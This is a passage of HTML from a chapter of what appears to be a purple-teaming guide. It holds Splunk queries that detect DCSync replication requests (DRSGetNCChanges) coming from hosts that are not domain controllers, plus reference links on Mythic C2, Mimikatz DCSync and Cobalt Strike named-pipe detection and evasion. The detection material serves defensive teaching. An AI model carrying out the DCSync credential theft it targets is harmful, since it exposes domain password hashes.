+<span class="nv">id</span><span class="o">.</span><span class="nv">orig_h</span><span class="o">!=</span><span class="p">"</span><span class="s2">10.0.1.14</span><span class="p">"</span>
+</code></pre></div></div>
+<p>The same query adapted to use the domain controller lookup file.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">zeek</span> 
+<span class="nv">sourcetype</span><span class="o">=</span><span class="p">"</span><span class="s2">bro:dce_rpc:json</span><span class="p">"</span> 
+<span class="nv">operation</span><span class="o">=</span><span class="p">"</span><span class="s2">DRSGetNCChanges</span><span class="p">"</span> 
+<span class="nv">NOT</span> <span class="p">[</span> <span class="o">|</span> <span class="nv">inputlookup</span> <span class="nv">attackrange_dcs</span><span class="o">.</span><span class="nv">csv</span> <span class="o">|</span> <span class="nb">rename</span> <span class="nv">IPAddress</span> <span class="nv">AS</span> <span class="nv">id</span><span class="o">.</span><span class="nv">orig_h</span> <span class="o">|</span> <span class="nv">fields</span> <span class="nv">id</span><span class="o">.</span><span class="nv">orig_h</span> <span class="p">]</span>
+</code></pre></div></div>
+<hr />
+<h2 id="resources">Resources</h2>
+<p>The following resources expand on topics covered in this chapter.
+<br />
+<br /></p>
+<h4 id="the-mythic-command-and-control-framework-1">The Mythic Command-and-Control Framework</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Mythic’s rebranding from the original name, Apfell</h6>
+               <p><i>Cody Thomas, "A Change of Mythic Proportions," Aug 13, 2020</i></p>
+                <a target="_blank" href="https://posts.specterops.io/a-change-of-mythic-proportions-21debeb03617" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Mythic’s Webshell agent, Arachne</h6>
+               <p><i>Cody Thomas, "Spinning Webs — Unveiling Arachne for Web Shell C2," Feb 7, 2024</i></p>
+                <a target="_blank" href="https://posts.specterops.io/spinning-webs-unveiling-arachne-for-web-shell-c2-26c40f570ea1" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>This site provides a general overview of the features supported by publicly available Mythic agents</h6>
+               <p><i>"Mythic Community Agent Feature Matrix," accessed November 9, 2024</i></p>
+                <a target="_blank" href="https://mythicmeta.github.io/overview/agent_matrix.html" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Slides from Calum Hall and Luke Roberts’s talk at BlackHat USA 2021 covering the abuse potential of macOS remote management features</h6>
+               <p><i>Calum Hall, Luke Roberts, "Come to the Dark Side, We Have Apples: Turning macOS Management Evil," accessed July 1, 2024</i></p>
+                <a target="_blank" href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Come-To-The-Dark-Side-We-Have-Apples-Turning-MacOS-Management-Evil.pdf" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>The Mythic Python library that can be used for scripting and other framework automation, installed via <code>pip</code></h6>
+               <p><i>"Mythic Scripting," accessed November 1, 2024</i></p>
+                <a target="_blank" href="https://github.com/MythicMeta/Mythic_Scripting" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>The completed Jupyter notebook developed in this chapter</h6>
+               <p><i>"AGPT-CP10-Mythic-Whoami-Task-Example.ipynb," June 22, 2024</i></p>
+                <a target="_blank" href="https://aguidetopurpleteaming.com/resources/10/AGPT-CP10-Mythic-Whoami-Task-Example.ipynb" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="simulating-domain-compromise-1">Simulating Domain Compromise</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Details of Microsoft's best practice for hardening Active Directory domain controllers, including restricting internet access</h6>
+               <p><i>"Securing Domain Controllers Against Attack," May 30, 2024</i></p>
+                <a target="_blank" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/securing-domain-controllers-against-attack" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Details of Mimikatz's DCSync attack including command-line arguments</h6>
+               <p><i>Sean Metcalf, "Mimikatz DCSync Usage, Exploitation, and Detection,” September 25, 2015</i></p>
+                <a target="_blank" href="https://adsecurity.org/?p=1729" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="defending-against-the-attack-1">Defending Against the Attack</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Details of Mimikatz's DCSync attack including command-line arguments</h6>
+               <p><i>Sean Metcalf, "Mimikatz DCSync Usage, Exploitation, and Detection,” September 25, 2015</i></p>
+                <a target="_blank" href="https://adsecurity.org/?p=1729" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A deep-dive into the default named and anonymous pipes used in Cobalt Strike post-exploitation and effective strategies to detect these</h6>
+               <p><i>Riccardo Ancarani, "Detecting Cobalt Strike Default Modules via Named Pipe Analysis,” November 20, 2020</i></p>
+                <a target="_blank" href="https://labs.withsecure.com/publications/detecting-cobalt-strike-default-modules-via-named-pipe-analysis" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Details of Cobalt Strike's malleability to evade detections for default named pipes, produced in response to Riccardo's previously referenced post</h6>
+               <p><i>Raphael Mudge, "Learn Pipe Fitting for all of your Offense Projects,” February 9, 2021</i></p>
+                <a target="_blank" href="https://www.cobaltstrike.com/blog/learn-pipe-fitting-for-all-of-your-offense-projects" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<div class="container">
+ <div class="row">
+   <div class="col" style="text-align: left">
+      <a href="/part-II/ad-recon-with-mitre-caldera/" class="btn btn-primary">&lt;&lt; Chapter 9</a>
+   </div>
+   <div class="col" style="text-align: right">
+      <a href="/part-III/reporting-and-tracking/" class="btn btn-primary">Chapter 11 &gt;&gt;</a>
+   </div>
+ </div>
+</div>
+			</article>
+		</div>
+	</main>
+		<!-- Footer -->
+ <footer class="footer-chulapa text-center mt-0 pt-3">
+   <div class="container">
+     <div class="row">
+       <div class="col-xl-10 offset-xl-1"><div role="navigation" class="d-flex flex-wrap justify-content-center"><a href="https://github.com/orgs/aguidetopurpleteaming" title="footerRepo on Github" class="chulapa-footer-sociallink lead"><span class="fa-stack fa-lg" aria-hidden="true">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+              </span><span class="sr-only">Repo on Github</span>
+            </a></div><p class="mt-2 mb-3">&copy; 2025 ajpc500</p>
+          <!-- Do not remove this in order to give  attributions -->
+         <p class="chulapa-footer-brand">Powered by <a href="https://dieghernan.github.io/chulapa"> <span class="chulapa">Chulapa</span> Jekyll Theme</a><br><b>Lux</b> skin by <a href="https://bootswatch.com/">Bootswatch</a></p>
+          <!-- End  attributions -->
+       </div>
+     </div>
+ </div>
+</footer>
+<!-- Footer -->
+<!-- JS, Popper.js, and jQuery -->
+	<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/js/chulapa_script.js"></script>
+	<!-- start custom scripts to be placed at the bottom of the page -->
+<!-- end custom bottom scripts -->
+	</body>
+</html>
